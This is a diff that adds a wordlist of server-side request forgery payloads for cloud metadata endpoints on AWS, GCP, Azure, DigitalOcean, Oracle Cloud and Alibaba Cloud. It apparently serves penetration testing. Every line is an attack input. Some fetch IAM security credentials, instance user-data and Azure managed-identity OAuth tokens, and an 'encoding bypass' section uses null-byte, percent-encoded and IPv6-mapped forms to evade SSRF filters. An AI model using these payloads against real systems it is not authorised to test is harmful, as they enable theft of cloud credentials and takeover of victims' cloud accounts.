@@ -1,0 +1,43 @@
+# SSRF Cloud Metadata Service payloads
+# Source: PayloadsAllTheThings, HackTricks Cloud SSRF, AWS/GCP/Azure docs
+# Purpose: Access cloud provider instance metadata endpoints to confirm SSRF
+
+# AWS IMDSv1 (no auth required)
+http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
+http://169.254.169.254/latest/meta-data/ami-id
+http://169.254.169.254/latest/meta-data/instance-id
+http://169.254.169.254/latest/meta-data/public-ipv4
+http://169.254.169.254/latest/meta-data/hostname
+http://169.254.169.254/latest/user-data
+http://169.254.169.254/latest/dynamic/instance-identity/document
+http://169.254.169.254/
+
+# AWS with encoding bypass
+http://169.254.169.254%2flatest%2fmeta-data%2f
+http://169.254.169.254%00/latest/meta-data/
+http://[::ffff:169.254.169.254]/latest/meta-data/
+
+# GCP metadata (requires Metadata-Flavor header, but test anyway)
+http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/
+http://metadata.google.internal/computeMetadata/v1/project/project-id
+http://169.254.169.254/computeMetadata/v1/
+http://metadata.google.internal/
+
+# Azure Instance Metadata Service
+http://169.254.169.254/metadata/instance?api-version=2021-02-01
+http://169.254.169.254/metadata/instance/compute?api-version=2021-02-01
+http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/
+
+# DigitalOcean
+http://169.254.169.254/metadata/v1.json
+http://169.254.169.254/metadata/v1/
+http://169.254.169.254/metadata/v1/id
+http://169.254.169.254/metadata/v1/hostname
+
+# Oracle Cloud
+http://169.254.169.254/opc/v2/instance/
+
+# Alibaba Cloud
+http://100.100.100.200/latest/meta-data/
